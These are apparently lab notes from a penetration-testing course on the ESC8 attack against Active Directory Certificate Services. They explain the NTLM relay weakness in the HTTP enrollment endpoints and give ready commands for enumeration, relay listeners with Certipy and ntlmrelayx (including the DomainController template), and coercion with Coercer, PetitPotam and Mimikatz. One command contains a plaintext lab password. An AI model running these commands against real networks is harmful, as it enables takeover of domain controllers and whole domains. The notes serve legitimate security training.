## ESC8 NTLM Relay ANY domain computer to AD CS HTTP Endpoints ##

#### What's running under the hood ####
- AD CS enables users and computers to enroll using HTTP(S) endpoints through multiple server roles like:
	- HTTP - Web Enrollment (HTTP)
	- HTTPS - Certificate Enrollment Web Service (CES), Certificate Enrollment Policy Web Service, Network Device Enrollment Service (NDES)

#### What the attack is about ####
- The web enrollment interfaces used by the above roles are vulnerable to NTLM relay attacks in their default configurations.
- Using NTLM relay, an attacker on a **compromised machine can impersonate any inbound-NTLM-authenticating AD account**.
- While impersonating the compromised account, an attacker could access these web interfaces and request a client authentication certificate based on the **User** or **Machine** certificate templates.
- The **web enrollment interface** (an older looking ASP application accessible at `http://<caserver>/certsrv/`), by default only supports HTTP, which cannot protect against NTLM relay attacks. In addition, it explicitly only allows NTLM authentication via its Authorization HTTP header, so more secure protocols like Kerberos are unusable.
- The **Certificate Enrollment Service (CES)**, **Certificate Enrollment Policy (CEP) Web Service**, and **Network Device Enrollment Service (NDES)** support negotiate authentication by default via their Authorization HTTP header. Negotiate authentication support Kerberos and NTLM; consequently, an attacker can negotiate down to NTLM authentication during relay attacks. These web services do at least enable HTTPS by default, but unfortunately HTTPS by itself does not protect against NTLM relay attacks. Only when HTTPS is coupled with channel binding can HTTPS services be protected from NTLM relay attacks. Unfortunately, AD CS does not enable Extended Protection for Authentication on IIS, which is necessary to enable channel binding.

### Enumeration ###
1. **Certify** (not always reliable)
`PS C:\ADCS\Auditor> .\Certify.exe cas`

2. **certutil**
`PS C:\ADCS\Auditor> certutil.exe -enrollmentServerURL -config cb-ca.cb.corp\CB-CA`

3. **PSPKI**
```powershell
PS C:\ADCS\Auditor> Import-Module PSPKI
PS C:\ADCS\Auditor> Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

### Exploitation ###
##### Listener for incoming certificates #####
1. **Certipy**
- By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
- For domain controllers, we must specify `-template DomainController`.
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# certipy relay -ca cb-ca.cb.corp
```

2. **Impacket-NTLMRelayx**
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# impacket-ntlmrelayx.py -t http://cb-ca.cb.corp/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
```

##### Coercion ####
1. **Coercer** (useful if patches have been applied)
```bash
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CESP-ADCS]
└─# python3 Coercer.py coerce -l cb-ws33.certbulk.cb.corp -t cb-dc.certbulk.cb.corp -u student33 -p htTz2J72nH9KuAXr -d certbulk.cb.corp -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```

2. **PetitPotam**
```powershell
PS C:\ADCS\Auditor> .\PetitPotam.exe 172.16.100.33 172.16.67.1
```

3. **PetitPotam.ps1**
```powershell
PS C:\ADCS\Auditor> Import-Module .\Invoke-Petitpotam.ps1
PS C:\ADCS\Auditor> Invoke-Petitpotam -Target 172.16.67.1 -CaptureHost 172.16.100.33
```

4. **Mimikatz**
```powershell
PS C:\ADCS\Auditor> .\mimikatz.exe "misc::efs /server:cb-dc.certbulk.cb.corp /connect:172.16.100.33"
```